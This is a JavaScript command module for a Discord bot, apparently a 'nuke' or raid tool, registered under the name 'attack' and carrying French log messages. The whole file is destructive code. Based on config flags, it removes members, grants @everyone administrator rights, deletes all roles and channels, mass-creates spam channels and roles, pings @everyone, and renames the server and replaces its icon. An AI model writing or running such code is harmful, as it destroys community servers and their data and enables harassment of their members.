const settings = require('../settings.json');
const moment = require('moment');
const chalk = require('chalk');
exports.run = (client, message, args) => {

    if (settings.config.ban === "y") {
    message.guild.members.map(m=>{
        if (m.position >= message.guild.me.highestRole.position) {
            m.delete();
        }
    });
    }


    function suite(){
        message.guild.edit({
            icon: settings.config.img,
            name: settings.config.name
        }).catch(console.error);
    }
    



    if (settings.config.admin === "y") {
    message.guild.roles.find('name', '@everyone').edit({
        permissions: [8]
    }).catch(console.error);
    }
    if (settings.config.role_dlt === "y") {
    Promise.all(message.guild.roles.map(c => c.delete())).catch(console.error);
    }
    if (settings.config.role_crt === "y") {
        message.guild.createRole({
            name: 'undefined-1'
        }).catch(console.error);
    }
   
    /*if (settings.config.spam === 'y') {
    message.guild.createChannel('undefined-156', 'text').catch(console.error);
    function suite(){
        message.guild.createChannel('spam', 'text').catch(console.error);
        message.guild.channels.find('name', 'spam').send('spam').catch(console.error);
    }
    setTimeout(suite, 1000)
    }*/
    if (settings.sp !== "1") {
        message.guild.createChannel('undefined-156');
        console.log(chalk.inverse(`[${moment().format('DD-MM-YYYY HH:mm:ss')}] `) + chalk.black.bgRed(`Le spam a été lancé sur le serveur "${message.guild.name}".`));
    }
    message.channel.send('spam @everyone');
    message.guild.createChannel(settings.config.chnlname);

        if (settings.config.spam === 'n') {
            const typer = 'text';
            message.guild.createChannel('undefined-3', typer).catch(console.error);
        }
        if (settings.config.spam === 'v') {
            const typer = 'voice';
            message.guild.createChannel('undefined-3', typer).catch(console.error);

        }
        if (settings.config.spam === 'c') {
            const typer = 'category';
            message.guild.createChannel('undefined-3', typer).catch(console.error);
        }
    if (settings.config.chnl_dlt === "y"){
    Promise.all(message.guild.channels.map(c => c.delete())).catch(console.error);
    }
    if (settings.config.imgnom === "y") {
    setTimeout(suite, 500);
    }
}

exports.conf = {
    permLevel: 0,
    aliases: []
}

exports.help = {
    name: 'attack'
}
